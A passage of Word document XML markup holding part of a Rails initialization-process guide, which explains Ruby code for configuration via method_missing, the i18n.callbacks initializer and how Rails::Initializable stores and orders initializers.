      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defined further down in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>configuration.rb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0A804A3B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A417C54" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>method_missing(name, *args, &amp;blk)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D4B668E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name.to_s =~ /=$/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20AA065E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @@options[$`.to_sym] = args.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35C30124" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  elsif</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@@options.key?(name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150F9660" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @@options[name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1208A19E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="702CDB79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    super</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03ECB030" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A2FE566" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76AC7A8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So therefore when an option is referred to it simply stores the value as the key if it’s used in a setter context, or retrieves it if used in a getter context. Nothing fancy going on there.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E620C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.37 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/i18n_railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04845CEB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After the configuration method the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reloader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is defined, and then the first of of Railties’ initializers is defined: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n.callbacks</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="75DE8474" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64ED690D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializer "i18n.callbacks"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02E41515" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ActionDispatch::Reloader.to_prepare do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="030975B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    I18n::Railtie.reloader.execute_if_updated</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CF4971E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E560A85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="748C44F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method (from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module) here doesn’t run the block, but rather stores it to be run later on:</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53A2CD27" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="443E5DB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializer(name, opts = {}, &amp;blk)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="279E3948" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ArgumentError, "A block must be passed when defining an initializer"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>blk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C084609" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  opts[:after] ||= initializers.last.name unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializers.empty? || initializers.find { |i| i.name == opts[:before] }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6473C107" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  initializers &lt;&lt; Initializer.new(name, nil, opts, &amp;blk)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47C109D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="27A5216B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An initializer can be configured to run before or after another initializer, which we’ll see a couple of times throughout this initialization process. Anything that inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may also make use of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method, something which is covered in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1087" w:anchor="rails-railtie-initializer" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Configuration guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FFCDF5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class here is defined within the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module and its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is defined to just set up a couple of variables:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6714C9D4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="648CD970" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize(name, context, options, &amp;block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A7E88B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @name, @context, @options, @block</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= name, context, options, block</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="334E8A1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="238FC7AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is finished, the object is added to the object the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6528"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="44B853DF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DEBDC69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C739A90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @initializers</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= self.class.initializers_for(self)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39FD47CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E766807" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@initializers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> isn’t set (which it won’t be at this point), the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>intializers_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method will be called for this class.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="68E293BE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F81C276" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializers_for(binding)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="400E14B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Collection.new(initializers_chain.map { |i| i.bind(binding) })</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="773C8C62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="574AE1E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/initializable.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and includes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>TSort</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module which is used to sort out the order of the initializers based on the order they are placed in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC81FE5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializers_chain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method referenced in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializers_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is defined like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7F1F636C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E7C8603" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializers_chain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A2DD144" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  initializers = Collection.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AC2160A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> ancestors.reverse_each do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>| klass |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72D44C88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    next</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>klass.respond_to?(:initializers)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5588E182" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    initializers = initializers + klass.initializers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F402BD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BDEBB5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  initializers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AC693C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
